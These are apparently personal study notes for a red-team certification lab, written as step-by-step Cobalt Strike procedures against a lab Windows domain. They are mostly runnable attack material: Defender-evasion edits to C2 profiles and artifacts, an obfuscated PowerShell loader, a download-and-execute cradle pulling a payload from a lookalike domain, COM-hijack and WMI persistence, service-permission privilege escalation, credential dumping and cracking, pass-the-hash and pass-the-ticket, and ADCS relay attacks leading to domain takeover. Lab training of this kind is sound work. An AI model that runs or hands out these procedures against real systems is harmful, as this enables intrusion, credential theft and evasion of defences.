# CRTO-Notes

Notes for CRTO

## Create Listener CS

Http

    Name: http
    Payload: Beacon HTTP
    HTTP Hosts: www.bleepincomputer.com
    HTTP Host (Stager) : www.bleepincomputer.com

SMB

    Name: smb
    Payload: Beacon SMB
    Pipename: TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337

TCP

    Name: tcp
    Payload: Beacon TCP
    Port: 4444
    Bind to localhost: False

TCP (local)

    Name: tcp-local
    Payload: Beacon TCP
    Port: 1337
    Bind to localhost: True

<img width="1069" height="578" alt="image" src="https://github.com/user-attachments/assets/a10ff89b-9fd4-4188-80fa-0458ea6703c9" />

Generate payloads for each listener.

    Go to Payloads > Windows Stageless Generate All Payloads
    Folder: C:\Payloads
    Click Generate
    
<img width="1064" height="244" alt="image" src="https://github.com/user-attachments/assets/5b9287ea-8be8-43d5-aba3-2ff23a1b8f5f" />

### Defence Evasion
## Malleable C2
Open a new PowerShell window in Terminal.
    SSH into the team server VM.
        ssh attacker@10.0.0.5
        The password is Passw0rd!.

    Move into the profiles directory.
        cd /opt/cobaltstrike/profiles

    Open default.profile in a text editor (e.g. vim or nano).

    Add the following stage block:
#### Tambahin paling bawah 
    Profile
    TypeCopy
    stage {
        set userwx "false";
        set cleanup "true";
        set copy_pe_header "false";
        set module_x64 "Hydrogen.dll";

        transform-x64 {
            strrep "beacon.x64.dll" "bacon.x64.dll";
            strrep "%02d/%02d/%02d" "%02d/%02d/%04d";
            strrep "%s as %s\\\\%s: %d" "%s - %s\\\\%s: %d";
            strrep "%02d/%02d/%02d %02d:%02d:%02d" "%02d-%02d-%02d %02d:%02d:%02d";
            strrep "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x00\\x80\\x00\\x00" "\\x48\\x89\\x5C\\x24\\x08\\x57\\x48\\x83\\xEC\\x20\\x48\\x8B\\x59\\x10\\x48\\x8B\\xF9\\x48\\x8B\\x49\\x08\\xFF\\x17\\x33\\xD2\\x41\\xB8\\x01\\x80\\x00\\x00";
        }
    }

    Add the following post-ex block:

    Profile
    TypeCopy
    post-ex {
        set spawnto_x64 "%windir%\\\\sysnative\\\\werfault.exe";
        set cleanup "true";
        set pipename "dotnet-diagnostic-#####, ########-####-####-####-############";
        set thread_hint "ntdll.dll!RtlUserThreadStart+0x2c";
        set amsi_disable "true";

        transform-x64 {
            strrep "This program cannot be run in DOS mode." "This is totally not a PE.";
            strrepex "PowerPick" "CLRCreateInstance failed w/hr 0x%08lx" "CLRCreateInstance failed: 0x%08lx";
            strrepex "PowerPick" "Failed to get default AppDomain w/hr 0x%08lx" "Failed to get default AppDomain: 0x%08lx";
            strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Unhandled exception.";
            strrepex "ExecuteAssembly" "Failed to load the assembly w/hr 0x%08lx" "Failed to load the assembly: 0x%08lx";
        }
    }

    Add the following process-inject block:

    Profile
    TypeCopy
    process-inject {
        set allocator "VirtualAllocEx";
        set bof_allocator "VirtualAlloc";
        set bof_reuse_memory "true";
        set min_alloc "8192";
        set startrwx "false";
        set userwx "false";

        execute {
            CreateThread "ntdll.dll!RtlUserThreadStart+0x2c";
            NtQueueApcThread-s;
            NtQueueApcThread;
            SetThreadContext;
        }
    }
### Save the changes.
### Restart the team server.
        sudo /usr/bin/docker restart cobaltstrike-cs-1

    Check the container logs to ensure there are no profile errors.
        sudo /usr/bin/docker logs cobaltstrike-cs-1

## Artifact Kit

    Launch Visual Studio Code.

    Go to File > Open Folder and select C:\Tools\cobaltstrike\arsenal-kit\kits\artifact.

    Navigate to src-common and open patch.c.

    Scroll to line ~45 and modify the for loop. This is for the svc exe payloads.

    c
    TypeCopy
    x = length;
    while ( x-- ) {
      * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
    }

    Scroll to line ~116 and modify the other for loop. This is for the normal exe payloads.

    c
    TypeCopy
    int x = length;
    while ( x-- ) {
      * ( ( char * ) ptr + x ) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
    }

### Save the changes (File > Save) and close the folder (File > Close Folder).

### On the Windows taskbar, right-click on the Terminal icon and launch Ubuntu WSL.
### Change the working directory.
    cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact

    Run build.sh to build the new artifacts.
    ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts

## Load the Aggressor Script.
      Open the Cobalt Strike client.
      Go to Cobalt Strike > Script Manager.
      Click Load.
      Navigate to C:\Tools\cobaltstrike\custom-artifacts\mailslot and select artifact.cna.


    
### Resource Kit
## If not already open from the previous task, launch Ubuntu WSL from the Windows Terminal.
## Change the working directory on unbuntu.
    cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
## Run build.sh to copy the resource templates.
        ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
## If not already open from the previous task, launch Visual Studio Code.
## Go to File > Open Folder and select C:\Tools\cobaltstrike\custom-resources.
## Select template.x64.ps1.
## Scroll to line 5 and replace .Equals('System.dll') with .Equals('Sys'+'tem.dll').
## Scroll to line 32 and replace it with:
    $var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
    $ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)

## Save the changes (File > Save).
# Select compress.ps1.
Use Invoke-Obfuscation to create a unique obfuscated version, or try the following:
## PowerShell
    SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();

## Save the changes (File > Save).
    Open the Cobalt Strike client and load resources.cna from C:\Tools\cobaltstrike\custom-resources.
## Testing

    Host a 64-bit PowerShell payload.
        Go to Attacks > Scripted Web Delivery
        Select the http listener.
        Click Launch.

    Switch to Workstation and login with Passw0rd!.

    Open a PowerShell window.

    Download and invoke the PowerShell payload.

## PowerShell
    iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/a")

    Switch back to Attacker Desktop and a new Beacon should be checking in.

    From the new Beacon, impersonate a local admin to lon-ws-1.
        make_token CONTOSO\rsteel Passw0rd!

    Change the spawnto for the service payload.
        ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

    Move laterally to lon-ws-1.
        jump psexec64 lon-ws-1 smb

<img width="1062" height="526" alt="image" src="https://github.com/user-attachments/assets/add66db3-6b75-48d1-badd-098f71736af4" />

    In this lab, you have bypasses Windows Defender by modifying Cobalt Strike's default artifacts, resources, and post-exploitation behaviours.

# Initial Access

## Persistence

    Generate a DLL payload:
        Payloads > Windows Stageless Payload
        Listener: http
        Output: Windows DLL
        Exit Function: Thread
        Click Generate.
        Save it to C:\Payloads\http_x64.dll.

    We choose Thread as the exit function because this DLL will be loaded into a process that we don't want to have killed if we exit the Beacon.


## COM Hijack

From the Beacon running as pchilds:

Change Beacon's working directory.

beacon
    cd C:\Users\pchilds\AppData\Local\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
Upload the DLL payload to disk.
        upload C:\Payloads\http_x64.dll
Rename and timestomp the DLL to help it blend in with the existing files.
        mv http_x64.dll Microsoft.Teams.HttpClient.dll
        timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll
Add the registry entries to perform the COM hijack:    
        reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
        reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"

Switch to Workstation 1 and login with Passw0rd!. From the Windows start menu, launch Microsoft Teams.
Switch back to the Attacker Desktop and a new Beacon should appear from ms-teams.exe.
## In this lab, you have leveraged COM hijacking to force a trusted, signed Microsoft application to load and run a Beacon payload for persistence.

# Privesc
## Enumeration
The objective of this lab is to exploit weak registry permissions on a service for privilege escalation.
Interact with the Beacon running as pchilds.
Change the spawnto to msedge.
    spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
Use PowerShell to search for services where low-priv users have FullControl rights.
    powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}

return : This should return BadWindowsService.
<img width="755" height="245" alt="image" src="https://github.com/user-attachments/assets/4cb7cff0-dec8-4064-99e0-848b6f4c87dc" />

## Exploitation
Set the spawnto for the service binary payload.
        ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
Generate a service binary payload.
        Payloads > Windows Stageless Payload.
        Listener: http
        Output: Windows Service EXE
        Click Generate
        Save to C:\Payloads\http_x64.svc.exe
Stop the service.
        sc_stop BadWindowsService
Change Beacon's current working directory.
        cd C:\Temp
    Upload the payload to disk.
        upload C:\Payloads\http_x64.svc.exe
    Get the service's current binary path.
        sc_qc BadWindowsService
    Reconfigure the service to point to the payload.
        sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2
    Start the service.
        sc_start BadWindowsService
The elevated Beacon should appear within a few seconds.
<img width="972" height="503" alt="image" src="https://github.com/user-attachments/assets/e01a662b-0b0e-4b91-b111-2c739019fc6b" />

Restore the service's binary path.
beacon
    sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2 
Delete the service payload.
    rm http_x64.svc.exe
Start the service again.
    sc_start BadWindowsService
### In this lab, you have abused a weak service permission for privilege escalation.

# Post-Ex
## Session passing
Use:    spawn [x86|x64] [listener]
        spawn [listener]

Spawn an x86 or x64 process and inject shellcode for the listener.

beacon> spawn x64 http


    
# Privesc - lab
beacon
    powerpick $lowpriv = @('Everyone', 'BUILTIN\Users', 'NT AUTHORITY\Authenticated Users'); ls 'HKLM:\SYSTEM\CurrentControlSet\Services' | % { $acl = Get-Acl $_.PSPath; foreach ($ace in $acl.Access) { if ($ace.AccessControlType -eq 'Allow' -and $ace.IsInherited -eq $false -and $lowpriv -contains $ace.IdentityReference.Value -and $ace.RegistryRights -eq [System.Security.AccessControl.RegistryRights]::FullControl) { [PSCustomObject] @{ServiceName = $_.PSChildName; Identity = $ace.IdentityReference.Value; Rights = $ace.RegistryRights }}}}

Set the spawnto for the service binary payload.
    ak-settings spawnto_x64 C:\Windows\System32\svchost.exe

Generate a service binary payload.
        Payloads > Windows Stageless Payload.
        Listener: http
        Output: Windows Service EXE
        Click Generate
        Save to C:\Payloads\http_x64.svc.exe

Stop the service.
        sc_stop BadWindowsService

Change Beacon's current working directory.
        cd C:\Temp

Upload the payload to disk.
        upload C:\Payloads\http_x64.svc.exe

Get the service's current binary path.
        sc_qc BadWindowsService

Reconfigure the service to point to the payload.
        sc_config BadWindowsService C:\Temp\http_x64.svc.exe 0 2

Start the service.
        sc_start BadWindowsService

The elevated Beacon should appear within a few seconds.
Restore the service's binary path.
    sc_config BadWindowsService "C:\Program Files\Bad Windows Service\Service Executable\BadWindowsService.exe" 0 2

Delete the service payload.
        rm http_x64.svc.exe

Start the service again.
        sc_start BadWindowsService

# Elevate Persis
WMI Event Subscription
Launch Visual Studio Code or PowerShell ISE.
Create a new file.
Paste the following code:

    function Add-WmiPersistence
    {
       $EventFilterArgs = @{
          EventNamespace = 'root/cimv2'
          Name = "Debug Trace"
          Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"
          QueryLanguage = 'WQL'
       }

       $Filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $EventFilterArgs

       $CommandLineConsumerArgs = @{
          Name = "Debug Consumer"
          CommandLineTemplate = "C:\Windows\System32\windbg.exe -trace"
       }

       $Consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs

       $FilterToConsumerArgs = @{
          Filter = $Filter
          Consumer = $Consumer
       }

       Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
    }

    function Remove-WmiPersistence
    {
        Get-WMIObject -Namespace root/Subscription -Class __EventFilter -Filter "Name='Debug Trace'" | Remove-WmiObject -Verbose
        Get-WMIObject -Namespace root/Subscription -Class CommandLineEventConsumer -Filter "Name='Debug Consumer'" | Remove-WmiObject -Verbose
        Get-WMIObject -Namespace root/Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Debug%'" | Remove-WmiObject -Verbose
    }

This will trigger when the computer updates its Group Policy Objects.
Save the script as C:\Tools\WmiPersistence.ps1.
Launch Cobalt Strike and connect to the team server.
    Generate a DNS payload.
        Payloads > Windows Stageless Payload
        Listener: dns
        Click Generate
        Save to C:\Payloads\dns_x64.exe

Interact with the SYSTEM Beacon.
Upload the payload.
        upload C:\Payloads\dns_x64.exe
        mv dns_x64.exe windbg.exe

Install the backdoor (using self-injection).
        powershell-import C:\Tools\WmiPersistence.ps1
        psinject [BEACON PID] x64 Add-WmiPersistence

Trigger the backdoor (can be done in Beacon)
        execute gpupdate /target:computer /force

A new DNS Beacon should appear within a few seconds.
Remove the persistence
        psinject [BEACON PID] x64 Remove-WmiPersistence

In this lab, you have leveraged a WMI event subscription to execute a payload when the computer refreshes its Group Policy Objects.

# Credential Access
## Credentials from Web Browsers
    execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins

## Windows Credential Manager
    beacon> run vaultcmd /listcreds:"Windows Credentials" /all
    execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
    execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
## OS Credential Dumping
### LSASS Memory (NTLM Hashes)
    mimikatz sekurlsa::logonpasswords
    PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 1000 .\ntlm.hash .\example.dict -r .\rules\dive.rule
fc525c9683e8fe067095ba2ddc971889:Passw0rd!

## Kerberos Keys
Mimikatz's sekurlsa::ekeys command will dump user's Kerberos encryption keys.
// Note that Mimikatz incorrectly labels each hash as des_cbc_md4.  The hash at the top has a length of 64 and is aes256-cts-hmac-sha1-96.  You may also see aes128-cts-hmac-sha1-96 and rc4_hmac which are 32 in length.

The hash format required by Hashcat is 
    $krb5db$18$<username>$<DOMAIN-FQDN>$<hash> and can be cracked using hash mode 28900.

    PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 28900 .\sha256.hash .\example.dict -r .\rules\dive.rule
$krb5db$18$rsteel$CONTOSO.COM$05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960:Passw0rd!


## OPSEC
The GrantedAccess mask of 0x1010 is consistent with PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ, which are the minimum privileges required for reading memory.

## Security Account Manager
    mimikatz !lsadump::sam
## LSA Secrets

mimikatz !lsadump::secrets

## Cached Domain Credentials
mimikatz !lsadump::cache
// Take note of the number of iterations the passwords are hashed with, as this is required when attempting to crack them.  The default (as indicated by the output above) is 10240.
    PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 2100 .\mscachev2.hash .\example.dict -r .\rules\dive.rule
$DCC2$10240#rsteel#0ac91f0033a92c25a174679953789ba:Passw0rd!

## Kerberos Tickets
### AS-REP Roasting
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /format:hashcat /nowrap
// By default, Rubeus outputs hashes for John the Ripper.  Use /format:hashcat to output them for Hashcat instead.

PS C:\Tools\hashcat> .\hashcat.exe -a 0 -m 18200 .\asrep.hash .\example.dict -r .\rules\dive.rule
$krb5asrep$23$oracle_svc@contoso.com:92d6f[...snip...]19124:Passw0rd!
### Kerberoasting
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /format:hashcat /simple
These hashes can be cracked using hashcat's 13100 hash mode.
    .\hashcat.exe -a 0 -m 13100 .\kerb.hash .\example.dict -r .\rules\dive.rule
    
### A safer approach is to use an enumeration tool to triage potential targets first, then roast them more selectively.
Another effective strategy is to create one or more dummy SPNs that are not backed by a legitimate service, in which case, a TGS-REQ/REP should never be generated for them.  Since most tools automatically enumerate and roast every account in a domain with an SPN set, a careless adversary can trigger this high-fidelity alert.
    
    execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
            
### Extracting Tickets
If an adversary gains elevated access to a computer, they can extract Kerberos tickets that are currently cached in memory.  Rubeus' triage command will enumerate every logon session present and their associated tickets.  If multiple logon session exist (i.e. multiple users are logged onto the same computer), TGTs and/or service tickets for those users can be extracted and re-used by the adversary.

    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
    
// Rubeus' dump command with no additional parameters will extract every single ticket.  Use the /service and/or /luid parameters to target a specific service and/or logon session.  Tickets with krbtgt as the service are TGTs, other tickets are service tickets.
    
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0xd42c80(user domain admin) /service:krbtgt /nowrap

### Renewing TGTs
    C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFq[...snip...]uQ09N
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe renew /ticket:doIFq[...snip...]uQ09N /nowrap

## BOFs

RalfHacker has a number of Kerberos BOFs that are useful for instances where you don't want to use Rubeus with execute-assembly.  The included Aggressor scripts adds a few new Beacon commands, such as krb_triage and krb_dump.
Import script pada C:/tools
    krb_triage
    krb_dump /user:rsteel /service:krbtgt
    
# User Impersonate
## Token Impersonation
    make_token CONTOSO\rsteel Passw0rd!
To instruct Beacon to stop impersonating a token, whether made or stolen, run the rev2self command.  This calls the RevertToSelf API under the hood.
    ps
    token-store steal (pid)
     token-store use (id) / nomor yang muncul
## PTH
    sekurlsa::pth.
    pth [DOMAIN\user] [hash]
    pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889
    * Jika gagal
    mimikatz sekurlsa::pth /user:rsteel /domain:CONTOSO /ntlm:fc525c9683e8fe067095ba2ddc971889 /run:%COMSPEC%
    steal_token 1188(pid dari proses pth)
    ls \\lon-ws-1\c$
    rev2self
    kill pid (1188)
    
## PTT
### Requesting TGTs
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
### Injecting TGTs
Beacon has a kerberos_ticket_use command
    $ticket = "doIFo[...snip...]kNPTQ=="
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))
    run klist
    make_token CONTOSO\rsteel FakePass
    run klist
    kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
kerberos_ticket_purge.  When we no longer need the session, use rev2self to dispose of it, and the Beacon session goes back to pchilds' context.

### The Rubeus way
ptt /luid:[luid] /ticket:[ticket]. 
// Rubeus also has a createnetonly command which can be used instead of Beacon's make_token.  This spawns a hidden process in a new logon session and returns the PID and LUID.
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass
The process can be created and the ticket injected in a single command:
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x132ef34 /ticket:do..Snip...TNPTQ==
    steal_token 2524(pid hasil dari rubeus)
 To drop the impersonation, run rev2self and then terminate the spawned process using Beacon's kill command.

### Process Injection
Find a target process using the ps command or the process explorer, then inject shellcode for the given listener into it.
    ps
    inject (pid)5248 x64(aristektur) http(payload)
    
### The lab
Interact with the SYSTEM Beacon.
Attempt to list the C$ share on lon-ws-1.
    krb_triage
    krb_dump /user:rsteel /service:krbtgt
    [IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))
Pass the Ticket
    make_token CONTOSO\rsteel FakePass
    kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
    run klist
    ls \\lon-ws-1\C$
    rev2self

# Discovery
## Bloodhound
beacon> ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptorattacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/
buka ubuntu
    Desktop$ scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
    attacker@10.0.0.5's password: Passw0rd!
    attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Desktop$ bofhound -i logs/
    attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Desktop$ ls -l
    MATCH (n:User) WHERE n.hasspn=true RETURN n
A WMI filter is applied to a GPO by modifying the GPO's gPCWQLFilter attribute.
    ldapsearch (objectClass=groupPolicyContainer) --attributes displayname,gPCWQLFilter

# Lateral Movement
## jump
The syntax is jump [exploit] [target] [listener].  Running the command by itself will show the 'exploits' that are available (these are not really exploits, rather 'techniques').
    jump [exploit] [target] [listener]
## remote-exec
The syntax is remote-exec [method] [target] [command].
    remote-exec [method] [target] [command].
## Windows Remote Management
// Beacons executed via WinRM will run in the context of the current or impersonated user.
     jump winrm64 lon-ws-1 smb
WinRM is also the only remote-exec method that returns output, so it could be used for remote enumeration.
    remote-exec winrm lon-ws-1 net sessions     
## PsExec
    jump psexec64 lon-ws-1 smb
// Beacons executed via PsExec will always run as SYSTEM.
## custom Technique
    jump
    <img width="751" height="302" alt="image" src="https://github.com/user-attachments/assets/80149f40-22dd-4fab-b5a6-2805da66e15c" />
    jump scshell64 lon-ws-1 smb
## LOLBAS
This utility can be abused to inject any arbitrary DLL into a target process, using the syntax mavinject.exe [PID] /INJECTRUNNING [DLL PATH].  First, use remote-exec to list the running processes on the remote target.
    remote-exec winrm lon-ws-1 Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
Then, upload a DLL payload to the target and use MavInject to inject it into your chosen process.
    beacon> cd \\lon-ws-1\ADMIN$\System32
    beacon> upload C:\Payloads\smb_x64.dll

    beacon> remote-exec wmi lon-ws-1 mavinject.exe 1992 /INJECTRUNNING C:\Windows\System32\smb_x64.dll
Started process 1608 on lon-ws-1

    beacon> link lon-ws-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
<img width="946" height="99" alt="image" src="https://github.com/user-attachments/assets/b0ea6007-a9a0-41a8-9057-69f2a54f5902" />

Most mature organisations have a good handle on LOLBAS abuses.  They can be blocked outright using application control technologies such as AppLocker and WDAC, or their use simply logged via process creation events generated by Sysmon or other monitoring tools.  For those reasons, the use of LOLBAS is generally more applicable to adversary emulation rather than simulation.
## Security Logon Types
    powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
    powerpick Get-DomainTrust
## The lab LateralMov
Impersonate the rsteel user.
    make_token CONTOSO\rsteel Passw0rd!
Load the SCShell Aggressor script.
Go to Cobalt Strike > Script Manager.
Click Load.
Select C:\Tools\SCShell\CS-BOF\scshell.cna.
SCShell uses the service binary payload, so make sure to set the spawnto first.
    ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
    jump schell64 lon-ws-1 smb
# Pivoting
SOCKS
    socks 1080
<img width="971" height="593" alt="image" src="https://github.com/user-attachments/assets/2cd7ea64-56b2-4b5d-86da-a29c10262964" />

<img width="969" height="585" alt="image" src="https://github.com/user-attachments/assets/bf949045-e541-43de-9475-fee5eac9f675" />


# ADCS ESC1 lab
Enumerate the certificate authority for vulnerable templates.
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
This should reveal a template called ESC1.
Request a certificate, specifying the default domain Administrator's UserPrincipalName in the certificate's Subject Alternative Name (SAN).
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
Use Rubeus to request a TGT for Administrator.
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[CERT] /enctype:aes256 /nowrap
In this lab, you have learned how to identify and exploit ESC1 to gain domain admin privileges.

# ADCS ESC8
## Enumerate the certificate authority for vulnerabilities.
    execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet
This will show that lon-cs-1 is vulnerable to ESC8.
Use Beacon to start a SOCKS proxy.
    socks 1080 socks5
Run netstat to see that port 445 is currently bound.
Set the lanmanserver service's start mode to disabled to prevent it from automatically restarting.
    sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4
Stop these services in the following order to unbind port 445.
    sc_stop lanmanserver
    sc_stop srv2
    sc_stop srvnet
Run netstat and verify that 445 is no longer bound.
Start a reverse port forward that will bind to port 445 and redirect the traffic to 127.0.0.1:7445 on the attacker desktop.
    rportfwd_local 445 localhost 7445
    netstat will show 445 being bound again, but the PID will be that of the Beacon.
Port 445 is not always allowed inbound on the Windows firewall, particularly for Workstation. Add the rule:
    powerpick New-NetFirewallRule -DisplayName "File Sharing" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 445
On the Attacker Desktop, open a Command Prompt and run the Kali Docker container.
    docker container start -i kali-1
Configure proxychains to use Cobalt's SOCKS proxy.
Open /etc/proxychains.conf in vim or nano.
Scroll to the last line. 
Replace the default socks4 entry with 
    socks5 10.0.0.5 1080
Save the changes.

Use ntlmrelayx and proxychains to relay incoming authentication requests to the ADCS HTTP endpoint. We're going to relay the credentials of a domain controller, so we'll specifically request a DomainController certificate.
    proxychains impacket-ntlmrelayx -t http://10.10.120.5/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
While that is waiting, go back to Beacon.
Coerce the domain controller into authenticating to the current machine.

    execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
    The reverse port forward will tunnel the request down to ntlmrelayx, which should spring to life and relay up through the SOCKS proxy. A file called LON-DC-1.pfx should be created.
Press Ctrl+C to stop ntlmrelayx.    
Stop the SOCKS proxy.
    socks stop
Stop the reverse port forward.
    rportfwd stop 445
Restore the services back to default.
    sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 2
    sc_start srvnet
    sc_start srv2
    sc_start lanmanserver



# SQL Server Lab


## Cleanup
Remove the firewall rule.
    powerpick Remove-NetFirewallRule -DisplayName "File Sharing"
In this lab, you have learned how to identify and exploit ESC8 through a C2.



